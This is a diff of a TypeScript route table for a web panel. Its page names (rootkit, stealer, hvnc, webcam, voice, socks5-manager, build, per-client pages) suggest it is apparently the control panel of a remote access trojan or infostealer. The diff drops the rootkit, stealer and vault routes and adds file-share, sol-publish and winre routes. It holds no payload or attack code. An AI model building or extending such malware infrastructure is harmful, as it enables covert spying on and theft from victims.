@@ -68,16 +68,15 @@ const STATIC_PAGES: StaticPageDef[] = [
   { path: "/settings",           file: "settings.html",            access: "any",              checkPasswordChange: true },
   { path: "/logs",               file: "logs.html",                access: "any",              checkPasswordChange: true, permission: "audit:view" },
   { path: "/notifications",      file: "notifications.html",       access: "admin-or-operator", checkPasswordChange: true },
-  { path: "/vault",              file: "vault.html",               access: "admin-or-operator", checkPasswordChange: true },
-  { path: "/rootkit",            file: "rootkit.html",             access: "admin-or-operator", checkPasswordChange: true },
-  { path: "/stealer",            file: "stealer.html",             access: "admin-or-operator", checkPasswordChange: true },
   { path: "/users",              file: "users.html",               access: "admin",            checkPasswordChange: true },
   { path: "/user-client-access", file: "user-client-access.html",  access: "admin",            checkPasswordChange: true },
   { path: "/build",              file: "build.html",               access: "admin-or-operator" },
+  { path: "/sol-publish",        file: "sol-publish.html",         access: "admin" },
   { path: "/plugins",            file: "plugins.html",             access: "admin-or-operator" },
   { path: "/scripts",            file: "scripts.html",             access: "no-viewer" },
   { path: "/deploy",             file: "deploy.html",              access: "admin" },
   { path: "/socks5-manager",     file: "socks5-manager.html",      access: "no-viewer",        checkPasswordChange: true },
+  { path: "/file-share",          file: "file-share.html",          access: "no-viewer",        checkPasswordChange: true },
   { path: "/purgatory",          file: "purgatory.html",           access: "admin-or-operator", checkPasswordChange: true },
 ];
 
@@ -87,6 +86,7 @@ const QUERY_CLIENT_PAGES: QueryClientPageDef[] = [
   { path: "/webcam",        file: "webcam.html" },
   { path: "/hvnc",          file: "hvnc.html" },
   { path: "/voice",         file: "voice.html" },
+  { path: "/winre",         file: "winre.html" },
 ];
 
 /** Client-scoped pages accessed via path /:clientId/feature */
